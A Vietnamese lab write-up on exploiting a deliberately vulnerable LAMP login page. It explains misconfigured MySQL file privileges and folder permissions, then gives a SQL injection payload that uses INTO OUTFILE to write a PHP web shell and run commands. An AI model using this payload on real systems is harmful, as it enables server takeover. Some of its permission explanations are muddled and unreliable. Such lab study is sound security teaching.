Vào bài lab thì nó cho một giao diện đăng nhập như vậy và source code

<img width="348" height="181" alt="image" src="https://github.com/user-attachments/assets/ef31a9b3-eb89-43cf-9711-f9fe0d82c7b2" />


Dựa vào Soure code , ở trong `dockerfile` chúng ta thấy được cái image được dùng làm khuôn để build ở đây là LAMP STACK. Nó có sẵn tích hợp cả linux , apache , mysql , php

tiếp đến đoạn 
```
RUN echo "[mysqld]" >> /etc/mysql/my.cnf && \
    echo "secure-file-priv = \"\"" >> /etc/mysql/my.cnf
```
Đoạn code này thiết lập giá trị biến `secure-file-priv` là rỗng tức là hệ điều hành Linux cho phép Mysql thực hiện đọc ghi file bất cứ đâu trên ổ cứng của nó

Tiếp tục đoạn 
```docker
RUN chown -R www-data:www-data /var/www/html && \
    chmod -R 777 /var/www/html
```
Nó cho phép mọi account kết nối tới database , cho dù thuộc nhóm other đi chăng nữa đều có quyền Read , Write , Execute đối với folder `/var/www/html`

Đây là thư mục mà web server lưu trữ các đoạn code để hiển thị lên trình duyệt 

Ở trong `init.sql` 
```sql
-- tạo ra user01 , password 12345678
CREATE USER IF NOT EXISTS 'user01'@'%' IDENTIFIED BY '12345678';
GRANT ALL PRIVILEGES ON sqllab.* TO 'user01'@'%';
-- cấp quyền FILE , các bạn cứ hiểu như user thường kết nối với db chỉ được dùng các câu lệnh như union , select , update ,...
-- nếu dùng INTO OUTFILE là nó lỗi ngay
GRANT FILE ON *.* TO 'user01'@'%'; 
FLUSH PRIVILEGES;
```
chúng ta thấy được một account không phải là root được tạo ra để kết nối tới database nhưng lại được cấp quyền FILE và ở trong code của `db.php` thì cái kết nối từ web server tới database lại dùng cái account có quyền `FILE` đó 

Vẫn chưa hết , bởi vì ở đây Lab không tách riêng ra 2 service riêng lẻ ,service web và service db mà lại đi gộp chúng lại thành một service . Vậy điều này thì ảnh hưởng gì ?

Cái việc ghi file sẽ được thực hiện bởi MySQL tức là service web ,Bởi vì chúng ta đang cần ghi file vào trong /var/www/html , nếu mà service web riêng và service db riêng thì khi mà MySQL thực hiện ghi file vào /var/www/html thì nó sẽ khi vào bên trong `/var/www/html` container của nó . Không hề ảnh hưởng gì tới bên web cả 

Vậy nên khi không tách 2 service ra thì cái folder `/var/www/html` mà MySQL nó ghi file vào cũng chính là folder chứa những đoạn code mà web server dùng để hiển thị ra màn hình 

Tiếp tục Nhận thấy ở trong `login.php` lại dùng nối chuỗi từ dữ liệu nhập vào 
```sql
SELECT * FROM users WHERE username = '$username' AND password = '$password'
```
Ở trong bảng users chúng ta lại biết được có tổng cộng 3 cột . Thêm nữa chúng ta đã đủ điều kiện để có thể RCE , quyền được ghi file trên ổ cứng của hđh Linux , quyền FILE cho phép thực hiện các câu lệnh `SELECT ... INTO OUTFILE ...` , được cấp quyền 777 đối với thư mục /var/www/html ( cái thư mục chúng ta cần tấn công) và nơi MySQL ghi file vào là nơi Web Server sẽ đọc vào rồi thực thi 

vậy thì payload lúc này chúng ta truyền vào sẽ là 
```sql
' UNION SELECT "<?php system($_GET['cmd']); ?>",3,4 INTO OUTFILE '/var/www/html/shell.php' -- -
```
Lúc này `shell.php` đã được thêm vào folder `/var/www/html` và nó sẽ có nội dung như thế này

<img width="587" height="110" alt="image" src="https://github.com/user-attachments/assets/87fda272-5ced-4f80-aadc-eeea49d2219e" />


Và khi chúng ta gõ `/shell.php?cmd=ls -la` thì lúc này web server nó sẽ đi tìm trong /var/www/html coi có file nào là `shell.php` hay không , ở đây nếu bạn không truyền giá trị vào cho tham số cmd thì nó sẽ lỗi ngay , tại vì hàm system() lúc này sẽ nhận vào một giá trị rỗng 

Kết quả là chúng ta có được các file nằm trong /var/www/html của hệ thống 

<img width="1920" height="165" alt="image" src="https://github.com/user-attachments/assets/94373e31-e1a5-43f4-b41f-4147d618d9f2" />

**LƯU Ý CHO CÁC BẠN Ở ĐÂY: CHÚNG TA CHỈ CÓ THỂ RCE ĐƯỢC ĐỐI VỚI NHỮNG FOLDER CON NẰM TRONG /VAR/WWW/HTML MÀ THÔI BỞI VÌ Ở CÁI ĐOẠN CHMOD 777 KIA ĐÃ QUY ĐỊNH RÕ , CHỈ CHO PHÉP READ , WRITE , EXECUTE TRÊN /VAR/WWW/HTML**




